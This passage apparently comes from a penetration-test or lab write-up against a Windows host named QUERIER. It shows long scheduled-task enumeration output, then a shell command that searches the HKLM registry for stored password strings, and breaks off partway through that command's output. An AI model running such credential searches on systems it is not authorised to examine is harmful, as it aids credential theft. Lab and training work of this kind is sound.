Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Manual)
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\AppID
HostName:      QUERIER
TaskName:      \Microsoft\Windows\AppID\PolicyConverter
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\AppID\VerifiedPublisherCertStoreCheck
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Application Experience
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time: 5/29/2025 3:21:06 AM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time: 5/29/2025 4:05:44 AM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Application Experience\ProgramDataUpdater
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Application Experience\StartupAppTask
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\ApplicationData
HostName:      QUERIER
TaskName:      \Microsoft\Windows\ApplicationData\appuriverifierdaily
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\ApplicationData\appuriverifierinstall
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\ApplicationData\CleanupTemporaryState
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\ApplicationData\DsSvcCleanup
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\AppxDeploymentClient
HostName:      QUERIER
TaskName:      \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Autochk
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Autochk\Proxy
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\BitLocker
HostName:      QUERIER
TaskName:      \Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\BitLocker\BitLocker MDM policy Refresh
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Bluetooth
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Bluetooth\UninstallDeviceTask
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\BrokerInfrastructure
HostName:      QUERIER
TaskName:      \Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Chkdsk
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Chkdsk\ProactiveScan
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Chkdsk\SyspartRepair
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Clip
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Clip\License Validation
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\CloudExperienceHost
HostName:      QUERIER
TaskName:      \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Customer Experience Improvement Program
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Next Run Time: 5/29/2025 12:00:00 AM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Data Integrity Scan
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Next Run Time: 6/1/2025 6:18:09 PM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Next Run Time: 6/7/2025 2:07:41 AM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Defrag
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Defrag\ScheduledDefrag
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Device Information
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Device Information\Device
Next Run Time: 5/29/2025 3:03:47 AM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Device Information\Device
Next Run Time: 5/29/2025 4:32:33 AM
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Diagnosis
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Diagnosis\Scheduled
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\DirectX
HostName:      QUERIER
TaskName:      \Microsoft\Windows\DirectX\DXGIAdapterCache
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\DirectX\DXGIAdapterCache
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\DiskCleanup
HostName:      QUERIER
TaskName:      \Microsoft\Windows\DiskCleanup\SilentCleanup
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\DiskDiagnostic
HostName:      QUERIER
TaskName:      \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\DiskFootprint
HostName:      QUERIER
TaskName:      \Microsoft\Windows\DiskFootprint\Diagnostics
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\DiskFootprint\StorageSense
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\EDP
HostName:      QUERIER
TaskName:      \Microsoft\Windows\EDP\EDP App Launch Task
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\EDP\EDP Auth Task
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\EDP\EDP Inaccessible Credentials Task
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\EDP\StorageCardEncryption Task
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\ExploitGuard
HostName:      QUERIER
TaskName:      \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\File Classification Infrastructure
HostName:      QUERIER
TaskName:      \Microsoft\Windows\File Classification Infrastructure\Property Definition Sync
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Flighting
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Flighting\OneSettings
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Flighting\OneSettings\RefreshCache
Next Run Time: 5/29/2025 12:14:40 AM
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\InstallService
HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\ScanForUpdates
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\ScanForUpdates
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\ScanForUpdates
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\ScanForUpdatesAsUser
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\SmartRetry
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\SmartRetry
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\SmartRetry
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\SmartRetry
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\SmartRetry
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\SmartRetry
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\WakeUpAndContinueUpdates
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\InstallService\WakeUpAndScanForUpdates
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\License Manager
HostName:      QUERIER
TaskName:      \Microsoft\Windows\License Manager\TempSignedLicenseExchange
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Location
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Location\Notifications
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Location\WindowsActionDialog
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Maintenance
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Maintenance\WinSAT
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Maps
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Maps\MapsToastTask
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Maps\MapsUpdateTask
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\MemoryDiagnostic
HostName:      QUERIER
TaskName:      \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Mobile Broadband Accounts
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\MUI
HostName:      QUERIER
TaskName:      \Microsoft\Windows\MUI\LPRemove
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Multimedia
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Multimedia\SystemSoundsService
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\NetTrace
HostName:      QUERIER
TaskName:      \Microsoft\Windows\NetTrace\GatherNetworkInfo
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Offline Files
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Offline Files\Background Synchronization
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Offline Files\Logon Synchronization
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\PLA
HostName:      QUERIER
TaskName:      \Microsoft\Windows\PLA\Server Manager Performance Monitor
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Plug and Play
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Plug and Play\Device Install Group Policy
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Plug and Play\Sysprep Generalize Drivers
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\PushToInstall
HostName:      QUERIER
TaskName:      \Microsoft\Windows\PushToInstall\LoginCheck
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\PushToInstall\Registration
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\PushToInstall\Registration
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\RecoveryEnvironment
HostName:      QUERIER
TaskName:      \Microsoft\Windows\RecoveryEnvironment\VerifyWinRE
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Server Manager
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Server Manager\ServerManager
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Servicing
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Servicing\StartComponentCleanup
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Setup
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Setup\SetupCleanupTask
Next Run Time: 5/31/2025 6:00:00 AM
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\SharedPC
HostName:      QUERIER
TaskName:      \Microsoft\Windows\SharedPC\Account Cleanup
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Shell
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Shell\CreateObjectTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Shell\IndexerAutomaticMaintenance
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Software Inventory Logging
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Software Inventory Logging\Collection
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Software Inventory Logging\Configuration
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\SpacePort
HostName:      QUERIER
TaskName:      \Microsoft\Windows\SpacePort\SpaceAgentTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\SpacePort\SpaceAgentTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\SpacePort\SpaceManagerTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\SpacePort\SpaceManagerTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Speech
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Speech\HeadsetButtonPress
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Storage Tiers Management
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\TextServicesFramework
HostName:      QUERIER
TaskName:      \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Time Synchronization
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Time Synchronization\ForceSynchronizeTime
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Time Synchronization\SynchronizeTime
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Time Zone
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Time Zone\SynchronizeTimeZone
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\UPnP
HostName:      QUERIER
TaskName:      \Microsoft\Windows\UPnP\UPnPHostConfig
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Windows Defender
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Defender\Windows Defender Cleanup
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan
Next Run Time: 5/29/2025 3:06:27 AM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Defender\Windows Defender Verification
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Windows Error Reporting
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time: 5/28/2025 9:10:03 PM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time: 5/28/2025 9:13:56 PM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time: 5/28/2025 9:10:45 PM
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time: 5/28/2025 9:11:31 PM
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Windows Filtering Platform
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Windows Media Sharing
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Windows Media Sharing\UpdateLibrary
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\WindowsColorSystem
HostName:      QUERIER
TaskName:      \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\WindowsUpdate
HostName:      QUERIER
TaskName:      \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Wininet
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Wininet\CacheTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\Workplace Join
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\Workplace Join\Recovery-Check
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background
```

```
C:\Windows\System32>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest
    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK
    Text    REG_SZ    Prompt for user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT
    Text    REG_SZ    Automatic logon with current user name and password

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Page

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password - PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}
    (Default)    REG_SZ    WCN Password PIN

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI Page

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    V1PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}
    (Default)    REG_SZ    HomeGroup Password Command

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}
